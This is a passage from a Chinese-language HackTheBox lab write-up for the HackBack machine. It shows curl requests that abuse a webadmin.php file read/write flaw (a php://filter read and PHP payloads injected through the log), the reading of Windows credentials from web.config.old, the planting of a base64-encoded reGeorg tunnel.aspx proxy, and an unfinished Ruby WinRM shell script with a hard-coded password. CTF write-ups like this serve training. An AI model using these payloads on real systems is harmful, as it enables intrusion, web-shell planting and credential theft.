+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&amp;dir=.&amp;file=index.html&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/42.png"><br>成功返回index.html内容。为了防止乱码，在执行点中尝试通过php过滤器经过 base64 编码来读取php文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&amp;dir=.&amp;file=php://filter/convert.base64-encode/resource=webadmin.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/43.png"><br>成功返回，将内容进行 base64 解码即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat webadmin.php.bs64 | base64 -d</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/44.png"><br>既然可以读取文件，那么可以尝试写入文件，通过 file_out_contents 在目标上写入文件，先尝试获取一个base64编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mac is good&quot;</span> | base64 -w0</span><br></pre></td></tr></table></figure>
+<p>在执行点中将内容写入日志中完成命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$f</span>=<span class="string">&quot;bWFjIGlzIGdvb2QK&quot;</span>;file_put_contents(<span class="string">&quot;mac.txt&quot;</span>,base64_decode(<span class="variable">$f</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/45.png"><br>查看当前目录，发现 mac.txt 已经写入，需要注意的是以下命令得执行两次才能看到写入的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&amp;dir=.&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/47.png"><br>访问文件地址查看 mac.txt 文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/mac.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/48.png"><br>到目前为止，我们知道该执行点可以列出文件、查看文件以及写入文件。接下来在执行点中写入代码查看上层目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">&#x27;..&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/49.png"><br>查看上层文件路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&amp;dir=..&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/50.png"><br>发现 web.config 以及 web.config.old，那么继续在执行点中写入PHP代码查看它们的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;../web.config&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;../web.config.old&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/51.png"><br>在 web.config.old 中发现存在 windows 用户账号密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/52.png"></p>
+<h3 id="借助代理完成WinRM上线"><a href="#借助代理完成WinRM上线" class="headerlink" title="借助代理完成WinRM上线"></a>借助代理完成WinRM上线</h3><p>在之前的信息收集我们知道6666端口监听的是 winRM 服务，该站点上可以运行 ASP.NET 以及 php，但是在 php 中存在被阻止函数，所以我们尝试使用 ASP.NET 类型的代理，那么开始上传 regeorg 代理</p>
+<p><em><strong>工具地址：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></strong></em></p>
+<p>首先将tunnel.aspx转换为base64编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tunnel.aspx | base64 -w0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/53.png"><br>上传该base64编码并通过base64_decode()解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$f</span>=<span class="string">&quot;77u/PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0IiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQuU29ja2V0cyIgJT4NCjwlDQovKiAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICBfX19fXyAgIF9fX19fXyAgX198X19fICB8X18gIF9fX19fXyAgX19fX18gIF9fX19fICAgX19fX19fICANCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgDQogfCAgICAgXCB8ICAgX19ffHwgICB8ICB8ICAgIHx8ICAgX19ffHwgICAgIHx8ICAgICBcIHwgICB8ICB8IA0KIHxfX3xcX19cfF9fX19fX3x8X19fX19ffCAgX198fF9fX19fX3xcX19fX18vfF9ffFxfX1x8X19fX19ffCANCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffA0KICAgICAgICAgICAgICAgICAgICAuLi4gZXZlcnkgb2ZmaWNlIG5lZWRzIGEgdG9vbCBsaWtlIEdlb3JnDQogICAgICAgICAgICAgICAgICAgIA0KICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18NCiAgc2FtQHNlbnNlcG9zdC5jb20gLyBAdHJvd2FsdHMNCiAgZXRpZW5uZUBzZW5zZXBvc3QuY29tIC8gQGthbXBfc3RhYWxkcmFhZA0KDQpMZWdhbCBEaXNjbGFpbWVyDQpVc2FnZSBvZiByZUdlb3JnIGZvciBhdHRhY2tpbmcgbmV0d29ya3Mgd2l0aG91dCBjb25zZW50DQpjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZg0KcmVHZW9yZyBhc3N1bWUgbm8gbGlhYmlsaXR5IG9yIHJlc3BvbnNpYmlsaXR5IGZvciBhbnkNCm1pc3VzZSBvciBkYW1hZ2UgY2F1c2VkIGJ5IHRoaXMgcHJvZ3JhbS4NCg0KSWYgeW91IGZpbmQgcmVHZW9yZ2Ugb24gb25lIG9mIHlvdXIgc2VydmVycyB5b3Ugc2hvdWxkDQpjb25zaWRlciB0aGUgc2VydmVyIGNvbXByb21pc2VkIGFuZCBsaWtlbHkgZnVydGhlciBjb21wcm9taXNlDQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLg0KDQpGb3IgbW9yZSBpbmZvcm1hdGlvbiwgc2VlOg0KaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnDQoqLw0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgaWYgKFJlcXVlc3QuSHR0cE1ldGhvZCA9PSAiUE9TVCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7DQogICAgICAgICAgICBTdHJpbmcgY21kID0gUmVxdWVzdC5RdWVyeVN0cmluZy5HZXQoImNtZCIpLlRvVXBwZXIoKTsNCiAgICAgICAgICAgIGlmIChjbWQgPT0gIkNPTk5FQ1QiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7DQogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1UQVJHRVQiKTsNCiAgICAgICAgICAgICAgICAgICAgaW50IHBvcnQgPSBpbnQuUGFyc2UoUmVxdWVzdC5RdWVyeVN0cmluZy5HZXQoInBvcnQiKSk7DQogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOw0KICAgICAgICAgICAgICAgICAgICBJUEFkZHJlc3MgaXAgPSBJUEFkZHJlc3MuUGFyc2UodGFyZ2V0KTsNCiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLk5ldC5JUEVuZFBvaW50IHJlbW90ZUVQID0gbmV3IElQRW5kUG9pbnQoaXAsIHBvcnQpOw0KICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOw0KICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQ29ubmVjdChyZW1vdGVFUCk7DQogICAgICAgICAgICAgICAgICAgIHNlbmRlci5CbG9ja2luZyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOw0KICAgICAgICAgICAgICAgICAgICBzLkNsb3NlKCk7DQogICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KXsNCg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBTZXNzaW9uLkFiYW5kb24oKTsNCiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChjbWQgPT0gIkZPUldBUkQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGludCBidWZmTGVuID0gUmVxdWVzdC5Db250ZW50TGVuZ3RoOw0KICAgICAgICAgICAgICAgICAgICBieXRlW10gYnVmZiA9IG5ldyBieXRlW2J1ZmZMZW5dOw0KICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICgoYyA9IFJlcXVlc3QuSW5wdXRTdHJlYW0uUmVhZChidWZmLCAwLCBidWZmLkxlbmd0aCkpID4gMCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBleCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChjbWQgPT0gIlJFQUQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsNCiAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIHJlYWRCdWZmID0gbmV3IGJ5dGVbNTEyXTsNCiAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlICgoYyA9IHMuUmVjZWl2ZShyZWFkQnVmZikpID4gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQXJyYXkuQ29uc3RyYWluZWRDb3B5KHJlYWRCdWZmLCAwLCBuZXdCdWZmLCAwLCBjKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uQnVmZmVyLkJsb2NrQ29weShyZWFkQnVmZiwgMCwgbmV3QnVmZiwgMCwgYyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7DQogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjYXRjaCAoU29ja2V0RXhjZXB0aW9uIHNvZXgpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBSZXNwb25zZS5Xcml0ZSgiR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyIpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIChFeGNlcHRpb24gZXhLYWspDQogICAgew0KICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtRVJST1IiLCBleEthay5NZXNzYWdlKTsNCiAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7DQogICAgfQ0KJT4NCg==&quot;</span>;file_put_contents(<span class="string">&quot;tunnel.aspx&quot;</span>,base64_decode(<span class="variable">$f</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/54.png"><br>执行后访问日志，再查看文件可以发现隧道已经建立，说明成功上传代理脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session=&#x27;</span></span><br><span class="line">curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/55.png"><br>接下来设置 proxychains 本地代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line"><span class="comment">## 配置</span></span><br><span class="line">127.0.0.1 8888</span><br></pre></td></tr></table></figure>
+<p>使用 reGeorgSocksProxy 开启代理，建立 http 隧道</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/56.png"><br>通过 WinRm 脚本连接，对 Alamot 的Ruby脚本增添上传功能。代码如下</p>
+<p><em><strong>原脚本地址：<a target="_blank" rel="noopener" href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a></strong></em></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm-fs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"><span class="comment"># To upload a file type: UPLOAD local_path remote_path</span></span><br><span class="line"><span class="comment"># e.g.: PS&gt; UPLOAD myfile.txt C:\temp\myfile.txt</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;http://127.0.0.1:5985/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">&#x27;simple&#x27;</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">&#x27;ZonoProprioZomaro:-(&#x27;</span>,</span><br><span class="line">  <span class="symbol">:no_ssl_peer_verification</span> =&gt; <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">file_manager = WinRM::FS::FileManager.new(conn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span></span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">tokenize</span></span></span><br><span class="line">    <span class="keyword">self</span>.</span><br><span class="line">      split(<span class="regexp">/\s(?=(?:[^&#x27;&quot;]|&#x27;[^&#x27;]*&#x27;|&quot;[^&quot;]*&quot;)*$)/</span>).</span><br><span class="line">      select &#123;<span class="params">|s|</span> <span class="keyword">not</span> s.empty? &#125;.</span><br><span class="line">      map &#123;<span class="params">|s|</span> s.gsub(<span class="regexp">/(^ +)|( +$)|(^[&quot;&#x27;]+)|([&quot;&#x27;]+$)/</span>,<span class="string">&#x27;&#x27;</span>)&#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">&quot;-join($id,&#x27;PS &#x27;,$(whoami),&#x27;@&#x27;,$env:computername,&#x27; &#x27;,$((gi -force $pwd).Name),&#x27;&gt; &#x27;)&quot;</span>)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = gets</span><br><span class="line">        <span class="keyword">if</span> command.start_with?(<span class="string">&#x27;UPLOAD&#x27;</span>) <span class="keyword">then</span></span><br><span class="line">            upload_command = command.tokenize</span><br><span class="line">            print(<span class="string">&quot;Uploading &quot;</span> + upload_command[<span class="number">1</span>] + <span class="string">&quot; to &quot;</span> + upload_command[<span class="number">2</span>])</span><br><span class="line">            file_manager.upload(upload_command[<span class="number">1</span>], 